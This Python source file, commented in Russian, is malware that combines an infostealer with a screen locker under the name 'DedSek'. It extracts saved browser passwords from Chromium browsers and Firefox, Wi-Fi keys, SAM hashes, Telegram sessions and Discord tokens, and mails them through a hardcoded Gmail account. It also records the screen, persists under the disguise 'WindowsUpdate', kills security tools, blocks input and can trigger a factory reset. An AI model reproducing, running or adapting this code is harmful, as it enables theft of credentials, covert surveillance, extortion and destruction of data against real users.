import ctypes
import os
import sys
import time
import threading
import tempfile
import tkinter as tk
from tkinter import PhotoImage, scrolledtext
import shutil
import winshell
from win32com.client import Dispatch
import base64
import random
import socket
import subprocess
import json
import urllib.request
import urllib.parse
import smtplib
import imaplib
import email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import cv2
import numpy as np
from PIL import ImageGrab
import sqlite3
import winreg
import zipfile
import win32crypt
import re

# ============================================================
# >>> НАСТРОЙКИ <<<
PASSWORD = "1601"
MAX_ATTEMPTS = 4
TIMER_SECONDS = 10
SKULL_BASE64 = "YOUR_BASE64_STRING_HERE"

GMAIL_LOGIN = "xzx78848@gmail.com"
GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
RECEIVER_EMAIL = "xzx78848@gmail.com"
# ============================================================

attempts_left = MAX_ATTEMPTS

# ========== СКРЫТИЕ CMD ==========
def hide_console():
    try:
        if sys.executable.endswith("python.exe"):
            pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
            if os.path.exists(pythonw_path):
                subprocess.Popen([pythonw_path, __file__] + sys.argv[1:], creationflags=0x08000000)
                os._exit(0)
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.kernel32.FreeConsole()
    except:
        pass

# ========== БЛОКИРОВКА WIN ==========
def disable_win_key():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

def restore_win_key():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
    except:
        pass

# ========== ПОВЫШЕНИЕ ПРАВ ДО АДМИНА ==========
def run_as_admin():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        script = os.path.abspath(__file__)
        params = ' '.join([f'"{a}"' for a in sys.argv[1:]])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
        os._exit(0)
    except:
        pass
    return False

# ========== EDGE РАСШИФРОВКА (AES-GCM) ==========
def steal_edge_passwords():
    result = []
    paths = [
        os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
    ]
    
    for login_path in paths:
        if not os.path.exists(login_path):
            continue
        try:
            # Получаем мастер-ключ
            master_key = None
            local_state_path = os.path.join(os.path.dirname(os.path.dirname(login_path)), 'Local State')
            if os.path.exists(local_state_path):
                try:
                    with open(local_state_path, 'r', encoding='utf-8') as f:
                        local_state = json.load(f)
                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                    encrypted_key = encrypted_key[5:]  # Убираем 'DPAPI'
                    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                except:
                    pass
            
            temp_db = os.path.join(tempfile.gettempdir(), f'edge_{random.randint(1000,9999)}.db')
            shutil.copy2(login_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                
                try:
                    # v10 (DPAPI)
                    if encrypted_password[:3] == b'\x01\x00\x00':
                        password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                    # v11 (AES-GCM)
                    elif encrypted_password[:3] == b'\x76\x31\x31':
                        password = _decrypt_aes_gcm(encrypted_password[3:], master_key)
                    else:
                        password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                    
                    password = password.decode('utf-8', errors='ignore')
                    result.append(f"EDGE | {url} | {username} | {password}")
                except:
                    result.append(f"EDGE | {url} | {username} | ***")
            
            conn.close()
            try:
                os.remove(temp_db)
            except:
                pass
        except:
            pass
    
    return result

def _decrypt_aes_gcm(data, key):
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        nonce = data[:12]
        ciphertext = data[12:]
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ciphertext, None)
    except:
        raise

# ========== CHROMIUM ПАРОЛИ ==========
def steal_chromium_passwords(browser_name, paths):
    result = []
    for login_path in paths:
        if not os.path.exists(login_path):
            continue
        try:
            # Получаем мастер-ключ для AES-GCM
            master_key = None
            local_state_path = os.path.join(os.path.dirname(os.path.dirname(login_path)), 'Local State')
            if os.path.exists(local_state_path):
                try:
                    with open(local_state_path, 'r', encoding='utf-8') as f:
                        local_state = json.load(f)
                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                    encrypted_key = encrypted_key[5:]
                    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                except:
                    pass
            
            temp_db = os.path.join(tempfile.gettempdir(), f'{browser_name}_{random.randint(1000,9999)}.db')
            shutil.copy2(login_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                
                try:
                    if encrypted_password[:3] == b'\x01\x00\x00':
                        password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                    elif encrypted_password[:3] == b'\x76\x31\x31' and master_key:
                        password = _decrypt_aes_gcm(encrypted_password[3:], master_key)
                    else:
                        password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                    
                    password = password.decode('utf-8', errors='ignore')
                    result.append(f"{browser_name} | {url} | {username} | {password}")
                except:
                    result.append(f"{browser_name} | {url} | {username} | ***")
            
            conn.close()
            try:
                os.remove(temp_db)
            except:
                pass
        except:
            pass
    return result

# ========== FIREFOX РАСШИФРОВКА ==========
def decrypt_firefox_profile(profile_path):
    result = []
    
    try:
        logins_file = os.path.join(profile_path, 'logins.json')
        key4_file = os.path.join(profile_path, 'key4.db')
        
        if not os.path.exists(logins_file) or not os.path.exists(key4_file):
            return result
        
        with open(logins_file, 'r', encoding='utf-8') as f:
            logins_data = json.load(f)
        
        conn = sqlite3.connect(key4_file)
        cursor = conn.cursor()
        
        cursor.execute("SELECT item1, item2 FROM metadata WHERE id = 'password'")
        meta_row = cursor.fetchone()
        if not meta_row:
            conn.close()
            return result
        
        cursor.execute("SELECT a11, a102 FROM nssPrivate LIMIT 1")
        nss_row = cursor.fetchone()
        if not nss_row:
            conn.close()
            return result
        
        a11, a102 = nss_row
        key_3des = a102[:24] if a102 and len(a102) >= 24 else None
        
        if not key_3des:
            conn.close()
            return result
        
        for login in logins_data.get('logins', []):
            hostname = login.get('hostname', '')
            username = "ERROR"
            password = "ERROR"
            
            try:
                enc_user = base64.b64decode(login['encryptedUsername'])
                iv, ct = _parse_firefox_asn1(enc_user)
                if iv and ct:
                    dec = _decrypt_3des(ct, key_3des, iv)
                    if dec:
                        username = dec.decode('utf-8', errors='ignore').lstrip('\x00').strip()
            except:
                pass
            
            try:
                enc_pass = base64.b64decode(login['encryptedPassword'])
                iv, ct = _parse_firefox_asn1(enc_pass)
                if iv and ct:
                    dec = _decrypt_3des(ct, key_3des, iv)
                    if dec:
                        password = dec.decode('utf-8', errors='ignore').lstrip('\x00').strip()
            except:
                pass
            
            result.append(f"FIREFOX | {hostname} | {username} | {password}")
        
        conn.close()
    
    except:
        pass
    
    # Если всё ERROR - отправляем файлы
    all_errors = all("ERROR" in r for r in result) if result else True
    if all_errors:
        _send_firefox_files(profile_path, os.path.basename(profile_path))
        result.append("FIREFOX: Файлы отправлены на почту для ручной расшифровки")
    
    return result

def _parse_firefox_asn1(data):
    try:
        if data[0] != 0x30:
            return None, None
        
        length = data[1]
        offset = 2
        if length & 0x80:
            num_bytes = length & 0x7F
            length = int.from_bytes(data[2:2+num_bytes], 'big')
            offset += num_bytes
        
        iv = None
        ct = None
        end = offset + length
        
        while offset < end:
            tag = data[offset]
            offset += 1
            item_len = data[offset]
            offset += 1
            item = data[offset:offset+item_len]
            offset += item_len
            
            if tag == 0x04:
                if iv is None:
                    iv = item
                else:
                    ct = item
        
        return iv, ct
    except:
        return None, None

def _decrypt_3des(data, key, iv):
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        
        backend = default_backend()
        cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=backend)
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(data) + decryptor.finalize()
        
        padding_len = decrypted[-1]
        if padding_len < 16:
            return decrypted[:-padding_len]
        return decrypted
    except:
        return None

# ========== SAM ДАМП ==========
def dump_sam():
    result = []
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        
        sam_path = os.path.join(tempfile.gettempdir(), 'sam')
        sys_path = os.path.join(tempfile.gettempdir(), 'system')
        
        if is_admin:
            os.system(f'reg save HKLM\\SAM "{sam_path}" /y >nul 2>&1')
            os.system(f'reg save HKLM\\SYSTEM "{sys_path}" /y >nul 2>&1')
        else:
            # Повышение через PowerShell
            ps_cmd = f'''
$samPath = "{sam_path}"
$sysPath = "{sys_path}"
reg save HKLM\\SAM $samPath /y 2>$null
reg save HKLM\\SYSTEM $sysPath /y 2>$null
'''
            ps_file = os.path.join(tempfile.gettempdir(), 'dump.ps1')
            with open(ps_file, 'w', encoding='utf-8') as f:
                f.write(ps_cmd)
            
            subprocess.run(f'powershell -Command "Start-Process PowerShell -Verb RunAs -ArgumentList \\'-ExecutionPolicy Bypass -File \\"{ps_file}\\"\\'"', shell=True, capture_output=True)
            time.sleep(5)
            
            try:
                os.remove(ps_file)
            except:
                pass
        
        if os.path.exists(sam_path) and os.path.getsize(sam_path) > 100:
            hash_zip = os.path.join(tempfile.gettempdir(), 'sam_dump.zip')
            with zipfile.ZipFile(hash_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.write(sam_path, 'sam')
                zf.write(sys_path, 'system')
            
            send_file_email(hash_zip, "SAM+SYSTEM Dump")
            result.append(f"SAM+SYSTEM отправлены! Размер: {os.path.getsize(sam_path)} байт")
            result.append("Расшифровка: impacket-secretsdump -sam sam -system system LOCAL")
            
            for f in [hash_zip, sam_path, sys_path]:
                try:
                    os.remove(f)
                except:
                    pass
        else:
            result.append("Не удалось получить SAM. Нужен запуск от Администратора")
    
    except Exception as e:
        result.append(f"Ошибка дампа SAM: {str(e)}")
    
    return result

# ========== TELEGRAM / DISCORD ==========
def find_telegram():
    paths = [
        os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata'),
        os.path.join(os.environ['LOCALAPPDATA'], 'Telegram Desktop', 'tdata'),
    ]
    
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\TelegramDesktop", 0, winreg.KEY_READ)
        try:
            paths.append(os.path.join(winreg.QueryValueEx(key, "InstallDir")[0], 'tdata'))
        except:
            pass
        winreg.CloseKey(key)
    except:
        pass
    
    for path in paths:
        if os.path.exists(path):
            return path
    return None

def find_discord_tokens():
    tokens = set()
    leveldb_paths = [
        os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'),
        os.path.join(os.environ['APPDATA'], 'discordcanary', 'Local Storage', 'leveldb'),
        os.path.join(os.environ['APPDATA'], 'discordptb', 'Local Storage', 'leveldb'),
    ]
    
    for db_path in leveldb_paths:
        if not os.path.exists(db_path):
            continue
        try:
            for file in os.listdir(db_path):
                if file.endswith('.ldb') or file.endswith('.log'):
                    try:
                        with open(os.path.join(db_path, file), 'r', errors='ignore') as f:
                            tokens.update(re.findall(r'[MN][A-Za-z\d]{23}\.[A-Za-z\d]{6}\.[A-Za-z\d]{27}', f.read()))
                    except:
                        pass
        except:
            pass
    
    return list(tokens)[:20]

# ========== ОТПРАВКА ФАЙЛОВ ==========
def _send_firefox_files(profile_path, folder_name):
    try:
        key4 = os.path.join(profile_path, 'key4.db')
        logins = os.path.join(profile_path, 'logins.json')
        z = os.path.join(tempfile.gettempdir(), f'ff_{folder_name[:10]}.zip')
        with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
            if os.path.exists(logins):
                zf.write(logins, 'logins.json')
            if os.path.exists(key4):
                zf.write(key4, 'key4.db')
        send_file_email(z, f"Firefox {folder_name[:10]}")
        try:
            os.remove(z)
        except:
            pass
    except:
        pass

def _send_telegram(tg_path):
    try:
        z = os.path.join(tempfile.gettempdir(), 'telegram.zip')
        with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(tg_path):
                for file in files:
                    if file in ['key_datas', 'D877F783D5D3EF8C', 'settingss', 'maps'] or file.startswith('usertag') or file.startswith('data'):
                        try:
                            zf.write(os.path.join(root, file), file)
                        except:
                            pass
        send_file_email(z, "Telegram Session")
        try:
            os.remove(z)
        except:
            pass
    except:
        pass

# ========== МЕГА-СТИЛЕР ==========
def mega_steal_data():
    try:
        R = []
        R.append("=" * 60)
        R.append("DEDSEK MEGA STEALER - ПОЛНЫЙ ОТЧЁТ")
        R.append("=" * 60)
        
        R.append("\n--- БАЗОВАЯ ИНФОРМАЦИЯ ---")
        R.append(f"Пользователь: {os.environ.get('USERNAME', 'Unknown')}")
        R.append(f"Компьютер: {socket.gethostname()}")
        
        R.append("\n--- IPCONFIG ---")
        try:
            R.append(subprocess.check_output("ipconfig /all", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')[:5000])
        except:
            pass
        
        R.append("\n--- IP / GEO ---")
        try:
            R.append(f"Локальный IP: {socket.gethostbyname(socket.gethostname())}")
        except:
            pass
        try:
            pub_ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
            geo = json.loads(urllib.request.urlopen(f"http://ip-api.com/json/{pub_ip}", timeout=5).read())
            R.append(f"Внешний IP: {pub_ip} | {geo.get('country','?')} | {geo.get('city','?')} | {geo.get('isp','?')}")
        except:
            pass
        
        R.append("\n--- WIFI ПАРОЛИ ---")
        try:
            wifi_out = subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
            for line in wifi_out.split('\n'):
                if ':' in line and 'Все профили' in line:
                    p = line.split(':')[1].strip()
                    if p:
                        try:
                            det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
                            key = "НЕ НАЙДЕН"
                            for dl in det.split('\n'):
                                if 'Содержимое ключа' in dl or 'Key Content' in dl:
                                    key = dl.split(':')[1].strip()
                            R.append(f"WiFi: {p} | Пароль: {key}")
                        except:
                            pass
        except:
            pass
        
        R.append("\n" + "=" * 60)
        R.append("ПАРОЛИ БРАУЗЕРОВ")
        R.append("=" * 60)
        
        # Chrome
        R.append("\n--- CHROME ---")
        cp = steal_chromium_passwords("CHROME", [
            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
        ])
        R.extend(cp if cp else ["Нет данных"])
        
        # Yandex
        R.append("\n--- YANDEX ---")
        yp = steal_chromium_passwords("YANDEX", [
            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data')
        ])
        R.extend(yp if yp else ["Нет данных"])
        
        # Opera
        R.append("\n--- OPERA ---")
        op = steal_chromium_passwords("OPERA", [
            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Login Data'),
            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Opera Software', 'Opera Stable', 'Login Data')
        ])
        R.extend(op if op else ["Нет данных"])
        
        # Edge
        R.append("\n--- EDGE ---")
        ep = steal_edge_passwords()
        R.extend(ep if ep else ["Нет данных"])
        
        # Firefox
        R.append("\n--- FIREFOX ---")
        ff_base = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
        if os.path.exists(ff_base):
            ff_found = False
            for folder in os.listdir(ff_base):
                pf = os.path.join(ff_base, folder)
                if os.path.exists(os.path.join(pf, 'logins.json')):
                    ff_found = True
                    R.append(f"\nПрофиль: {folder}")
                    R.extend(decrypt_firefox_profile(pf))
            if not ff_found:
                R.append("Нет данных")
        else:
            R.append("Firefox не найден")
        
        R.append("\n" + "=" * 60)
        R.append("ПАРОЛЬ WINDOWS")
        R.append("=" * 60)
        R.extend(dump_sam())
        
        R.append("\n--- TELEGRAM ---")
        tg_path = find_telegram()
        if tg_path:
            _send_telegram(tg_path)
            R.append("Сессия Telegram отправлена!")
        else:
            R.append("Не найден")
        
        R.append("\n--- DISCORD ---")
        tokens = find_discord_tokens()
        if tokens:
            for t in tokens:
                R.append(f"ТОКЕН: {t}")
        else:
            R.append("Токены не найдены")
        
        R.append("\n" + "=" * 60)
        R.append(f"ОТЧЁТ: {time.strftime('%d.%m.%Y %H:%M:%S')}")
        
        text = '\n'.join(R)
        for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
            send_email(part, f"DedSek FULL [{i+1}]")
        
    except Exception as e:
        send_email(f"Ошибка: {e}")

def send_email(message, subject=None):
    try:
        if not subject:
            subject = f'DedSek - {os.environ.get("USERNAME", "Unknown")}'
        msg = MIMEText(message, 'plain', 'utf-8')
        msg['Subject'] = subject
        msg['From'] = GMAIL_LOGIN
        msg['To'] = RECEIVER_EMAIL
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
        s.send_message(msg)
        s.quit()
    except:
        pass

def send_file_email(file_path, description):
    try:
        msg = MIMEMultipart()
        msg['Subject'] = f'Файл: {description}'
        msg['From'] = GMAIL_LOGIN
        msg['To'] = RECEIVER_EMAIL
        with open(file_path, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(file_path)}"')
            msg.attach(part)
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=60)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
        s.send_message(msg)
        s.quit()
    except:
        pass

# ========== ЗАПИСЬ ЭКРАНА ==========
def record_and_send_loop():
    while True:
        try:
            vp = os.path.join(tempfile.gettempdir(), f"scr_{int(time.time())}.avi")
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(vp, fourcc, 10.0, (1280, 720))
            for _ in range(150):
                img = ImageGrab.grab()
                frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
                out.write(cv2.resize(frame, (1280, 720)))
                time.sleep(0.1)
            out.release()
            _send_video(vp)
            try:
                os.remove(vp)
            except:
                pass
        except:
            time.sleep(1)

def _send_video(fp):
    try:
        if os.path.getsize(fp) > 20*1024*1024:
            try:
                out = fp.replace('.avi', '.mp4')
                subprocess.run(['ffmpeg', '-i', fp, '-c:v', 'libx264', '-preset', 'ultrafast', '-crf', '35', '-b:v', '200k', '-s', '640x360', '-r', '10', '-y', out], capture_output=True, timeout=30)
                fp = out
            except:
                pass
        msg = MIMEMultipart()
        msg['Subject'] = f'Видео - {os.environ.get("USERNAME", "Unknown")}'
        msg['From'] = GMAIL_LOGIN
        msg['To'] = RECEIVER_EMAIL
        with open(fp, 'rb') as f:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f'attachment; filename="scr_{int(time.time())}.avi"')
            msg.attach(p)
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
        s.send_message(msg)
        s.quit()
    except:
        pass

# ========== ЧАТ (ФИКС - ВСЕГДА ПОВЕРХ) ==========
class VictimChat:
    def __init__(self, locker_window):
        self.locker = locker_window
        self.chat_window = None
        
    def show(self):
        if self.chat_window:
            return
        
        self.chat_window = tk.Toplevel()
        self.chat_window.geometry("380x480+60+60")
        self.chat_window.configure(bg='#00FF00')
        self.chat_window.attributes('-topmost', True)
        self.chat_window.overrideredirect(True)
        self.chat_window.focus_force()
        self.chat_window.grab_set()
        
        # Держим окно поверх всего
        def keep_top():
            while self.chat_window:
                try:
                    self.chat_window.lift()
                    self.chat_window.attributes('-topmost', True)
                    time.sleep(0.5)
                except:
                    break
        threading.Thread(target=keep_top, daemon=True).start()
        
        frame = tk.Frame(self.chat_window, bg='black', bd=2, relief='solid')
        frame.pack(fill='both', expand=True, padx=2, pady=2)
        
        header = tk.Frame(frame, bg='#00FF00')
        header.pack(fill='x')
        tk.Label(header, text="Чат DedSek", bg='#00FF00', fg='black', font=('Courier', 11, 'bold')).pack(side='left', padx=10, pady=5)
        tk.Button(header, text="✕", command=self.hide, bg='#FF0000', fg='white', font=('Courier', 12, 'bold'), bd=0, width=3, cursor='hand2').pack(side='right', padx=5, pady=3)
        
        self.history = scrolledtext.ScrolledText(frame, bg='#0a0a0a', fg='#00FF00', font=('Courier', 10), height=20, wrap=tk.WORD)
        self.history.pack(padx=10, pady=(0,5), fill='both', expand=True)
        self.history.config(state='disabled')
        
        inf = tk.Frame(frame, bg='black')
        inf.pack(padx=10, pady=(0,10), fill='x')
        self.entry = tk.Entry(inf, bg='#0a0a0a', fg='#00FF00', font=('Courier', 10), insertbackground='#00FF00', relief='solid', bd=1)
        self.entry.pack(side='left', fill='x', expand=True, ipady=3)
        self.entry.bind('<Return>', self.send_msg)
        tk.Button(inf, text="▶", command=self.send_msg, bg='#00FF00', fg='black', font=('Courier', 10, 'bold'), width=3, cursor='hand2', relief='solid', bd=1).pack(side='right', padx=(5,0))
        
        header.bind('<Button-1>', self.start_drag)
        header.bind('<B1-Motion>', self.drag)
        
        self.add_msg("DedSek", "Привет! Твой ПК заблокирован.")
        self.check_incoming()
    
    def start_drag(self, e):
        self.x, self.y = e.x_root, e.y_root
    
    def drag(self, e):
        self.chat_window.geometry(f"+{self.chat_window.winfo_x()+e.x_root-self.x}+{self.chat_window.winfo_y()+e.y_root-self.y}")
        self.x, self.y = e.x_root, e.y_root
    
    def hide(self):
        if self.chat_window:
            self.chat_window.grab_release()
            self.chat_window.destroy()
            self.chat_window = None
        self.locker.win.focus_force()
        self.locker.pw_entry.focus_force()
    
    def send_msg(self, e=None):
        m = self.entry.get().strip()
        if m:
            self.add_msg("Ты", m)
            self.entry.delete(0, tk.END)
            send_email(f"Сообщение:\n\n{m}")
    
    def add_msg(self, sender, msg):
        self.history.config(state='normal')
        self.history.insert('end', f'[{sender}]: {msg}\n\n')
        self.history.see('end')
        self.history.config(state='disabled')
    
    def check_incoming(self):
        def _check():
            while True:
                if not self.chat_window:
                    break
                try:
                    mail = imaplib.IMAP4_SSL('imap.gmail.com')
                    mail.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
                    mail.select('inbox')
                    _, data = mail.search(None, 'SUBJECT "COMMAND:"', 'UNSEEN')
                    if data[0]:
                        for num in data[0].split():
                            _, msg_data = mail.fetch(num, '(RFC822)')
                            msg = email.message_from_bytes(msg_data[0][1])
                            if msg.is_multipart():
                                for part in msg.walk():
                                    if part.get_content_type() == "text/plain":
                                        cmd = part.get_payload(decode=True).decode()
                                        if cmd.startswith("MSG:"):
                                            if self.chat_window:
                                                self.chat_window.after(0, self.add_msg, "DedSek", cmd[4:])
                            mail.store(num, '+FLAGS', '\\Seen')
                    mail.close()
                    mail.logout()
                except:
                    pass
                time.sleep(5)
        threading.Thread(target=_check, daemon=True).start()

# ========== ОСТАЛЬНОЕ ==========
def anti_debug():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            os._exit(0)
    except:
        pass

def add_to_startup():
    try:
        cp = os.path.abspath(__file__)
        pp = os.path.splitext(cp)[0] + ".pyw"
        if not cp.endswith(".pyw"):
            try:
                shutil.copy2(cp, pp)
            except:
                pass
            cp = pp
        sf = winshell.startup()
        sp = os.path.join(sf, "WindowsUpdate.lnk")
        sh = Dispatch('WScript.Shell')
        sc = sh.CreateShortCut(sp)
        sc.TargetPath = sys.executable.replace("python.exe", "pythonw.exe")
        sc.Arguments = f'"{cp}"'
        sc.WorkingDirectory = os.path.dirname(cp)
        sc.IconLocation = "shell32.dll,13"
        sc.save()
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{cp}"')
            winreg.CloseKey(k)
        except:
            pass
    except:
        pass

def block_input(block=True):
    try:
        ctypes.windll.user32.BlockInput(block)
    except:
        pass

def block_all_keys():
    try:
        import keyboard
        for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','alt','ctrl','shift','f11','print screen','alt+print screen','left windows','right windows']:
            try:
                keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
            except:
                pass
        for k in ['windows','left windows','right windows','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','scroll lock','pause']:
            try:
                keyboard.block_key(k)
            except:
                pass
    except:
        pass

def kill_processes():
    kl = ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe","procexp.exe","procmon.exe","processhacker.exe","wireshark.exe","ollydbg.exe","x64dbg.exe","x32dbg.exe"]
    while True:
        for p in kl:
            os.system(f"taskkill /f /im {p} >nul 2>&1")
        time.sleep(0.05)

def prevent_shutdown():
    try:
        ctypes.windll.user32.ShutdownBlockReasonCreate(ctypes.windll.kernel32.GetConsoleWindow(), "Windows Update...")
    except:
        pass

def full_windows_reset():
    try:
        restore_win_key()
        es = tk.Tk()
        es.attributes('-fullscreen', True)
        es.attributes('-topmost', True)
        es.configure(bg='black')
        es.overrideredirect(True)
        tk.Label(es, text="404 | ОШИБКА WINDOWS", bg='black', fg='#FF0000', font=('Courier', 40, 'bold')).pack(expand=True)
        tk.Label(es, text="КРИТИЧЕСКИЙ СБОЙ\nВСЕ ДАННЫЕ УНИЧТОЖАЮТСЯ...", bg='black', fg='#FF0000', font=('Courier', 20)).pack()
        es.update()
        time.sleep(5)
        es.destroy()
        os.system("taskkill /f /im explorer.exe >nul 2>&1")
        os.system("systemreset -factoryreset")
        time.sleep(3)
        os.system("shutdown /r /t 0 /f")
        os._exit(0)
    except:
        os.system("shutdown /r /t 0 /f")
        os._exit(0)

def boot_animation():
    a = tk.Tk()
    a.attributes('-fullscreen', True)
    a.attributes('-topmost', True)
    a.configure(bg='black')
    a.overrideredirect(True)
    disable_win_key()
    l = tk.Label(a, text="", bg='black', fg='white', font=('Courier', 20, 'bold'))
    l.pack(expand=True)
    for i in range(8):
        a.configure(bg='white' if i%2==0 else 'black')
        l.config(bg='white' if i%2==0 else 'black', fg='black' if i%2==0 else 'white')
        a.update()
        time.sleep(0.2)
    a.configure(bg='black')
    l.config(bg='black', fg='#00FF00')
    a.attributes('-alpha', 0)
    for alpha in range(0, 110, 5):
        a.attributes('-alpha', alpha/100)
        l.config(text="DedSek тебя взломал")
        a.update()
        time.sleep(0.03)
    time.sleep(1.5)
    for msg in ["Идёт шифровка...","[                    ] 0%","[####                ] 20%","[########            ] 40%","[############        ] 60%","[################    ] 80%","[####################] 100%","","ДАННЫЕ ЗАШИФРОВАНЫ!"]:
        l.config(text=msg)
        a.update()
        time.sleep(0.25)
    time.sleep(1)
    a.destroy()

class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True)
        self.win.attributes('-topmost', True)
        self.win.configure(bg='black')
        self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        
        global attempts_left
        
        try:
            img_data = base64.b64decode(SKULL_BASE64)
            img_path = os.path.join(tempfile.gettempdir(), "dedsek.png")
            with open(img_path, "wb") as f:
                f.write(img_data)
            img = PhotoImage(file=img_path)
            tk.Label(self.win, image=img, bg='black').place(relx=0.5, rely=0.05, anchor='center')
            self.win._img = img
        except:
            pass
        
        msg = f"""ПРИВЕТ! ТВОЙ WINDOWS ЗАБЛОКИРОВАН!

ДУМАЕШЬ, ЧТО ЗНАЕШЬ ПАРОЛЬ? НЕТ!

1. standard DES
$1$rjBkQ1jG$zqthRBo7xAfA4TTwBRhHv/

2. Bcrypt
$2y$10$/yFT/ZN1yJkgm4.8pSzTPOkhhEXOJC3H.gbs09EvKawKS3zz8Wf4e

3. Base64
MTI0Njk4ODA0

4. standard DES
$1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1

5. uuEncode
+.3@P-C

УДАЧИ. У ТЕБЯ {MAX_ATTEMPTS} ПОПЫТКИ!"""
        
        tk.Label(self.win, text=msg, bg='black', fg='#00FF00', font=('Courier', 9, 'bold'), justify='left').place(relx=0.5, rely=0.42, anchor='center')
        
        self.chat = VictimChat(self)
        self.chat_open = False
